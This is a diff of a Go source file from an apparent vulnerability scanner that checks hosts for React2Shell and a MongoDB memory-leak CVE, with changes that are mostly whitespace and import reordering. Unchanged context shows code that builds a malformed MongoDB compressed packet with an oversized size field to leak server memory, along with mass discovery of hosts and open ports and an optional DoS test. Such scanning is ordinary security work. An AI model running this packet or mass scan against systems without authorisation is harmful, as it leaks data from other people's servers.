@@ -8,48 +8,49 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
-	"io"
 	"github.com/h0tak88r/AutoAR/internal/logger"
+	"io"
 	"net"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
 
-	next88 "github.com/h0tak88r/AutoAR/internal/tools/next88"
 	"github.com/h0tak88r/AutoAR/internal/scanner/livehosts"
+	next88 "github.com/h0tak88r/AutoAR/internal/tools/next88"
 	"github.com/h0tak88r/AutoAR/internal/utils"
-	"github.com/projectdiscovery/httpx/runner"
 	"github.com/projectdiscovery/goflags"
+	"github.com/projectdiscovery/httpx/runner"
 	naaburesult "github.com/projectdiscovery/naabu/v2/pkg/result"
 	naaburunner "github.com/projectdiscovery/naabu/v2/pkg/runner"
 )
 
 // Options for zerodays scan
 type Options struct {
-	Domain              string   // Domain to scan (or subdomain)
-	Subdomain           string   // Single subdomain to scan (alternative to Domain)
-	DomainsFile         string   // File with domains (one per line)
-	HostsFile           string   // Alias for DomainsFile, file with hosts/subdomains/IPs
-	URLs                []string // Direct URLs to test
-	Threads             int      // Number of threads
-	DOSTest             bool     // Enable DoS test for React2Shell
-	EnableSourceExposure bool   // Enable source exposure check for React2Shell
-	Silent              bool     // Silent mode
-	CVEs                []string // CVEs to check: "CVE-2025-55182" (React2Shell), "CVE-2025-14847" (MongoDB)
-	MongoDBHost         string   // MongoDB host (for CVE-2025-14847)
-	MongoDBPort         int      // MongoDB port (default: 27017)
-	MongoDBLeakSize     int      // Memory leak size in bytes (default: 65536)
+	Domain               string   // Domain to scan (or subdomain)
+	Subdomain            string   // Single subdomain to scan (alternative to Domain)
+	DomainsFile          string   // File with domains (one per line)
+	HostsFile            string   // Alias for DomainsFile, file with hosts/subdomains/IPs
+	URLs                 []string // Direct URLs to test
+	Threads              int      // Number of threads
+	DOSTest              bool     // Enable DoS test for React2Shell
+	EnableSourceExposure bool     // Enable source exposure check for React2Shell
+	Silent               bool     // Silent mode
+	CVEs                 []string // CVEs to check: "CVE-2025-55182" (React2Shell), "CVE-2025-14847" (MongoDB)
+	MongoDBHost          string   // MongoDB host (for CVE-2025-14847)
+	MongoDBPort          int      // MongoDB port (default: 27017)
+	MongoDBLeakSize      int      // Memory leak size in bytes (default: 65536)
 }
 
 // Result holds scan results
 type Result struct {
-	Domain              string
-	React2ShellVulns    []React2ShellFinding
-	MongoDBVulns       []MongoDBFinding
-	TotalHostsScanned  int
-	TotalVulnerable    int
+	Domain            string
+	React2ShellVulns  []React2ShellFinding
+	MongoDBVulns      []MongoDBFinding
+	TotalHostsScanned int
+	TotalVulnerable   int
 }
 
 // React2ShellFinding represents a React2Shell vulnerability finding
@@ -61,12 +62,12 @@ type React2ShellFinding struct {
 
 // MongoDBFinding represents a MongoDB CVE-2025-14847 vulnerability finding
 type MongoDBFinding struct {
-	Host        string
-	Port        int
-	Vulnerable  bool
-	LeakedData   []byte
-	LeakSize    int
-	Error       string
+	Host       string
+	Port       int
+	Vulnerable bool
+	LeakedData []byte
+	LeakSize   int
+	Error      string
 }
 
 // logInfo logs an info message only if not in silent mode
@@ -96,7 +97,6 @@ func Run(opts Options) (*Result, error) {
 		// Default: check all
 		cvesToCheck = []string{"CVE-2025-55182", "CVE-2025-14847"}
 	}
-
 
 	// Check React2Shell (CVE-2025-55182)
 	if contains(cvesToCheck, "CVE-2025-55182") {
@@ -131,7 +131,7 @@ func Run(opts Options) (*Result, error) {
 			} else if result.TotalHostsScanned == 0 {
 				result.TotalHostsScanned = count
 			}
-			
+
 			for _, v := range mongoResult {
 				if v.Vulnerable {
 					result.TotalVulnerable++
@@ -254,7 +254,7 @@ func checkReact2Shell(opts Options) ([]React2ShellFinding, int, error) {
 			if info, err := os.Stat(liveHostsFile); err != nil || info.Size() == 0 {
 				// File doesn't exist, check if this single subdomain URL is live
 				opts.logInfo("[INFO] Checking if subdomain %s is live (single URL check, no enumeration)...", subdomainClean)
-				
+
 				// Check if subdomain is live using httpx directly (no enumeration)
 				liveURL, err2 := checkSingleSubdomainLive(subdomainClean, opts.Threads)
 				if err2 != nil {
@@ -263,12 +263,12 @@ func checkReact2Shell(opts Options) ([]React2ShellFinding, int, error) {
 				if liveURL == "" {
 					return nil, 0, fmt.Errorf("subdomain %s is not live", subdomainClean)
 				}
-				
+
 				// Create directory if needed
 				if err := os.MkdirAll(subsDir, 0755); err != nil {
 					return nil, 0, fmt.Errorf("failed to create subs directory: %w", err)
 				}
-				
+
 				// Write the single live URL to file
 				if err := os.WriteFile(liveHostsFile, []byte(liveURL+"\n"), 0644); err != nil {
 					return nil, 0, fmt.Errorf("failed to write live hosts file: %w", err)
@@ -465,7 +465,7 @@ func checkMongoDB(opts Options) ([]MongoDBFinding, int, error) {
 	} else {
 		// No explicit host provided - discover MongoDB instances
 		var liveHostsFile string
-		
+
 		// Priority 1: Use explicit HostsFile/DomainsFile if provided
 		if opts.HostsFile != "" {
 			liveHostsFile = opts.HostsFile
@@ -477,16 +477,16 @@ func checkMongoDB(opts Options) ([]MongoDBFinding, int, error) {
 			if target == "" {
 				target = opts.Domain
 			}
-			
+
 			if target != "" {
 				// Clean target
 				targetClean := strings.TrimPrefix(strings.TrimPrefix(target, "http://"), "https://")
 				targetClean = strings.TrimSuffix(targetClean, "/")
-				
+
 				// Determine if it's a subdomain
 				parts := strings.Split(targetClean, ".")
 				isSubdomain := len(parts) > 2
-				
+
 				resultsDir := utils.GetResultsDir()
 				var domainDir string
 				if isSubdomain {
@@ -496,7 +496,7 @@ func checkMongoDB(opts Options) ([]MongoDBFinding, int, error) {
 				}
 				subsDir := filepath.Join(domainDir, "subs")
 				liveHostsFile = filepath.Join(subsDir, "live-subs.txt")
-				
+
 				// Check if live hosts file exists
 				if info, err := os.Stat(liveHostsFile); err != nil || info.Size() == 0 {
 					opts.logWarn("[WARN] Live hosts file not found for %s, skipping MongoDB discovery", targetClean)
@@ -507,18 +507,18 @@ func checkMongoDB(opts Options) ([]MongoDBFinding, int, error) {
 
 		if liveHostsFile != "" {
 			opts.logInfo("[INFO] Discovering MongoDB instances by scanning %s for port %d...", liveHostsFile, port)
-			
+
 			// Use naabu to scan hosts for MongoDB port
 			discoveredHosts, err := discoverMongoDBHosts(liveHostsFile, port, opts.Threads, opts.Silent)
 			if err != nil {
 				return nil, 0, fmt.Errorf("failed to discover MongoDB hosts: %w", err)
 			}
-			
+
 			if len(discoveredHosts) == 0 {
 				opts.logWarn("[INFO] No MongoDB instances found on port %d", port)
 				return findings, 0, nil
 			}
-			
+
 			mongoHosts = discoveredHosts
 			opts.logWarn("[INFO] Found %d MongoDB host(s) with port %d open", len(mongoHosts), port)
 		} else {
@@ -585,7 +585,7 @@ func testMongoDBVulnerability(host string, port, leakSize int, silent bool) Mong
 		LeakSize:   leakSize,
 	}
 
-	address := fmt.Sprintf("%s:%d", host, port)
+	address := net.JoinHostPort(host, strconv.Itoa(port))
 	if !silent {
 		logger.GetLogger().Infof("[INFO] Testing MongoDB CVE-2025-14847 on %s", address)
 	}
@@ -643,7 +643,7 @@ func testMongoDBVulnerability(host string, port, leakSize int, silent bool) Mong
 		if !silent {
 			logger.GetLogger().Infof("[OK] MongoDB CVE-2025-14847: Vulnerable! Leaked %d bytes from %s", len(leakedData), address)
 		}
-		
+
 	} else {
 		if !silent {
 			logger.GetLogger().Infof("[INFO] MongoDB CVE-2025-14847: Not vulnerable or patched on %s", address)
@@ -660,7 +660,7 @@ func buildMalformedMongoDBPacket(leakSize int) ([]byte, error) {
 	// BSON document: {"isMaster": 1}
 	bsonPayload := []byte{
 		0x13, 0x00, 0x00, 0x00, // Document length (19 bytes)
-		0x10, // String type
+		0x10,                                         // String type
 		'i', 's', 'M', 'a', 's', 't', 'e', 'r', 0x00, // "isMaster"
 		0x01, 0x00, 0x00, 0x00, // Value: 1 (int32)
 		0x00, // End of document
@@ -691,18 +691,18 @@ func buildMalformedMongoDBPacket(leakSize int) ([]byte, error) {
 
 	// 3. Construct malicious OP_COMPRESSED packet
 	opCompressed := make([]byte, 0)
-	
+
 	// originalOpcode: 2004 (OP_QUERY)
 	opCompressed = append(opCompressed, make([]byte, 4)...)
 	binary.LittleEndian.PutUint32(opCompressed[len(opCompressed)-4:], 2004)
-	
+
 	// uncompressedSize: MALICIOUS large value (the vulnerability)
 	opCompressed = append(opCompressed, make([]byte, 4)...)
 	binary.LittleEndian.PutUint32(opCompressed[len(opCompressed)-4:], uint32(leakSize))
-	
+
 	// compressorId: 2 (zlib)
 	opCompressed = append(opCompressed, 0x02)
-	
+
 	// compressed data
 	opCompressed = append(opCompressed, compressed...)
 
@@ -773,7 +773,7 @@ func runNext88Scan(ctx context.Context, hosts []string, args []string, requested
 	if err != nil {
 		return nil, fmt.Errorf("next88 scan failed: %w", err)
 	}
-	
+
 	// Convert results to map
 	for _, result := range scanResults {
 		if result.Vulnerable != nil && *result.Vulnerable {
@@ -859,26 +859,26 @@ func checkSingleSubdomainLive(subdomain string, threads int) (string, error) {
 	if threads <= 0 {
 		threads = 1 // Single URL, only need 1 thread
 	}
-	
+
 	// Try both http and https
 	targets := []string{
 		"https://" + subdomain,
 		"http://" + subdomain,
 	}
-	
+
 	var liveURL string
 	var mu sync.Mutex
-	
+
 	// Configure httpx options
 	options := runner.Options{
-		InputTargetHost: targets,
-		Threads:        threads,
-		Silent:         true,
-		NoColor:        true,
-		FollowRedirects: true,
+		InputTargetHost:     targets,
+		Threads:             threads,
+		Silent:              true,
+		NoColor:             true,
+		FollowRedirects:     true,
 		FollowHostRedirects: true,
-		HTTPProxy:      os.Getenv("HTTP_PROXY"),
-		SocksProxy:     os.Getenv("SOCKS_PROXY"),
+		HTTPProxy:           os.Getenv("HTTP_PROXY"),
+		SocksProxy:          os.Getenv("SOCKS_PROXY"),
 		OnResult: func(result runner.Result) {
 			if result.URL != "" {
 				mu.Lock()
@@ -889,22 +889,22 @@ func checkSingleSubdomainLive(subdomain string, threads int) (string, error) {
 			}
 		},
 	}
-	
+
 	// Validate options
 	if err := options.ValidateOptions(); err != nil {
 		return "", fmt.Errorf("failed to validate httpx options: %w", err)
 	}
-	
+
 	// Create httpx runner
 	httpxRunner, err := runner.New(&options)
 	if err != nil {
 		return "", fmt.Errorf("failed to create httpx runner: %w", err)
 	}
 	defer httpxRunner.Close()
-	
+
 	// Run check
 	httpxRunner.RunEnumeration()
-	
+
 	return liveURL, nil
 }
 
@@ -914,14 +914,14 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 	if threads <= 0 {
 		threads = 50
 	}
-	
+
 	// Read hosts from live hosts file
 	file, err := os.Open(liveHostsFile)
 	if err != nil {
 		return nil, fmt.Errorf("failed to open live hosts file: %w", err)
 	}
 	defer file.Close()
-	
+
 	var hosts []string
 	scanner := bufio.NewScanner(file)
 	seen := make(map[string]struct{})
@@ -930,7 +930,7 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 		if line == "" {
 			continue
 		}
-		
+
 		// Extract hostname from URL
 		host := line
 		if strings.HasPrefix(host, "http://") {
@@ -944,7 +944,7 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 		if idx := strings.Index(host, ":"); idx != -1 {
 			host = host[:idx]
 		}
-		
+
 		if host == "" {
 			continue
 		}
@@ -954,28 +954,28 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 		seen[host] = struct{}{}
 		hosts = append(hosts, host)
 	}
-	
+
 	if err := scanner.Err(); err != nil {
 		return nil, fmt.Errorf("error reading live hosts file: %w", err)
 	}
-	
+
 	if len(hosts) == 0 {
 		return nil, fmt.Errorf("no hosts found in live hosts file")
 	}
-	
+
 	if !silent {
 		logger.GetLogger().Infof("[INFO] Scanning %d live host(s) for MongoDB port %d", len(hosts), mongoPort)
 	}
-	
+
 	// Use naabu to scan for MongoDB port
 	var mongoHosts []string
 	var mu sync.Mutex
-	
+
 	onResult := func(hr *naaburesult.HostResult) {
 		if hr == nil || len(hr.Ports) == 0 {
 			return
 		}
-		
+
 		// Extract hostname
 		host := hr.Host
 		if strings.HasPrefix(host, "http://") {
@@ -986,7 +986,7 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 		if idx := strings.Index(host, "/"); idx != -1 {
 			host = host[:idx]
 		}
-		
+
 		// Check if MongoDB port is open
 		for _, p := range hr.Ports {
 			if p != nil && p.Port == mongoPort {
@@ -1000,7 +1000,7 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 			}
 		}
 	}
-	
+
 	options := &naaburunner.Options{
 		Host:     goflags.StringSlice(hosts),
 		Ports:    fmt.Sprintf("%d", mongoPort),
@@ -1010,16 +1010,16 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 		Retries:  1,
 		OnResult: onResult,
 	}
-	
+
 	r, err := naaburunner.NewRunner(options)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create naabu runner: %w", err)
 	}
 	defer r.Close()
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
 	defer cancel()
-	
+
 	if err := r.RunEnumeration(ctx); err != nil {
 		// Return discovered hosts even if scan had errors
 		if len(mongoHosts) > 0 {
@@ -1030,6 +1030,6 @@ func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, sile
 		}
 		return nil, fmt.Errorf("naabu scan failed: %w", err)
 	}
-	
+
 	return mongoHosts, nil
 }
